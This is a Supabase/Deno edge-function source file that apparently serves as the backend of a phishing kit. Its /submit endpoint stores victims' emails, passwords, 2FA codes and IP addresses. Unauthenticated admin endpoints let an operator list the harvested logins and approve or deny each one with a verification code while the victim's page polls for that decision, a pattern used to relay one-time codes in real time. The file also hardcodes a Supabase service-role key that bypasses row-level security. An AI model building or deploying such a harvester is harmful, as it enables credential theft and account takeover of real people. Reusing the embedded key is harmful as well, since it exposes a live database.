import { serve } from "https://deno.land/std@0.168.0/http/server.ts"
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2'

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
  'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
}

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response('ok', { headers: corsHeaders })
  }

  try {
    // Use service role key to bypass RLS
    const supabaseClient = createClient(
      'https://nqsdardermkzppeaazbb.supabase.co',
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc1MDk1NjU2NSwiZXhwIjoyMDY2NTMyNTY1fQ._G6ZV0GjtQ7Q8ZV4GKOFDxKGhi_eQl2VP7eYfaf-GE8',
      {
        auth: {
          autoRefreshToken: false,
          persistSession: false
        }
      }
    )

    const url = new URL(req.url)
    const path = url.pathname
    
    // Extract endpoint from full path
    const endpoint = path.replace('/api-v2', '') || '/'

    console.log(`🚀 API-V2 Request: ${req.method} ${path} → ${endpoint}`)

    // TEST ROOT
    if (req.method === 'GET' && (endpoint === '/' || endpoint === '')) {
      return new Response(JSON.stringify({ 
        message: 'API V2 WORKING! 🎉',
        timestamp: new Date().toISOString(),
        success: true,
        version: '2.0',
        path: path,
        endpoint: endpoint,
        method: req.method,
        status: 'ACTIVE'
      }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      })
    }

    // SUBMIT LOGIN DATA
    if (endpoint === '/submit' && req.method === 'POST') {
      const body = await req.json()
      const { email, password, twofa, userAgent, currentPage } = body

      console.log(`📧 New login attempt: ${email}`)

      const { data, error } = await supabaseClient
        .from('requests')
        .insert([{
          email, 
          password, 
          twofa,
          user_agent: userAgent || 'Unknown',
          ip: req.headers.get('x-forwarded-for') || req.headers.get('cf-connecting-ip') || 'unknown',
          country: 'Unknown',
          page_status: currentPage || 'Login',
          status: 'pending'
        }])
        .select()

      if (error) {
        console.error('❌ Database error:', error)
        return new Response(JSON.stringify({ 
          success: false, 
          error: error.message,
          code: 'DB_ERROR'
        }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500,
        })
      }

      console.log('✅ Login data saved successfully')
      return new Response(JSON.stringify({ 
        success: true, 
        data,
        message: 'Login attempt recorded'
      }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      })
    }

    // GET REQUESTS (ADMIN)
    if (endpoint === '/requests' && req.method === 'GET') {
      console.log('📋 Fetching all requests...')
      
      const { data, error } = await supabaseClient
        .from('requests')
        .select('*')
        .order('created_at', { ascending: false })

      if (error) {
        console.error('❌ Database error:', error)
        return new Response(JSON.stringify({ 
          error: error.message,
          code: 'DB_ERROR'
        }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500,
        })
      }

      console.log(`✅ Found ${data?.length || 0} requests`)
      return new Response(JSON.stringify(data || []), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      })
    }

    // CHECK APPROVAL
    if (endpoint === '/check-approval' && req.method === 'GET') {
      const email = url.searchParams.get('email')
      
      if (!email) {
        return new Response(JSON.stringify({ 
          error: 'Email parameter required',
          code: 'MISSING_EMAIL'
        }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 400,
        })
      }

      console.log(`🔍 Checking approval for: ${email}`)

      const { data, error } = await supabaseClient
        .from('requests')
        .select('*')
        .eq('email', email)
        .order('created_at', { ascending: false })
        .limit(1)

      if (error) {
        console.error('❌ Database error:', error)
        return new Response(JSON.stringify({ 
          error: error.message,
          code: 'DB_ERROR'
        }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500,
        })
      }

      const request = data?.[0]
      const response = { 
        status: request?.status || 'not_found',
        verificationCode: request?.verification_code,
        id: request?.id,
        found: !!request
      }
      
      console.log(`✅ Status check result:`, response)
      return new Response(JSON.stringify(response), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      })
    }

    // APPROVE REQUEST
    if (endpoint === '/approve' && req.method === 'POST') {
      const body = await req.json()
      const { requestId, status, verificationCode, id, decision } = body

      // Support both formats: {requestId, status} and {id, decision}
      const finalId = id || requestId
      const finalStatus = decision || status

      console.log(`🎯 ${finalStatus} request ID: ${finalId}`)

      if (!finalId) {
        return new Response(JSON.stringify({ 
          success: false, 
          error: 'Request ID required',
          code: 'MISSING_ID'
        }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 400,
        })
      }

      const updateData = { 
        status: finalStatus,
        updated_at: new Date().toISOString()
      }

      if (verificationCode) {
        updateData.verification_code = verificationCode
      }

      const { data, error } = await supabaseClient
        .from('requests')
        .update(updateData)
        .eq('id', finalId)
        .select()

      if (error) {
        console.error('❌ Database error:', error)
        return new Response(JSON.stringify({ 
          success: false, 
          error: error.message,
          code: 'DB_ERROR'
        }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500,
        })
      }

      if (!data || data.length === 0) {
        return new Response(JSON.stringify({ 
          success: false, 
          error: 'Request not found',
          code: 'NOT_FOUND'
        }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 404,
        })
      }

      console.log(`✅ Request ${finalStatus} successfully`)
      return new Response(JSON.stringify({ 
        success: true, 
        data,
        message: `Request ${finalStatus} successfully`
      }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      })
    }

    // 404 - Not Found
    return new Response(JSON.stringify({
      error: 'Endpoint Not Found',
      fullPath: path,
      endpoint: endpoint,
      method: req.method,
      available: [
        'GET / - API status',
        'POST /submit - Submit login data', 
        'GET /requests - Get all requests',
        'GET /check-approval?email=xxx - Check approval status',
        'POST /approve - Approve/deny request'
      ],
      timestamp: new Date().toISOString()
    }), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      status: 404,
    })

  } catch (error) {
    console.error('💥 Server Error:', error)
    return new Response(JSON.stringify({ 
      error: 'Internal Server Error',
      message: error.message,
      code: 'SERVER_ERROR',
      timestamp: new Date().toISOString()
    }), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      status: 500,
    })
  }
}) 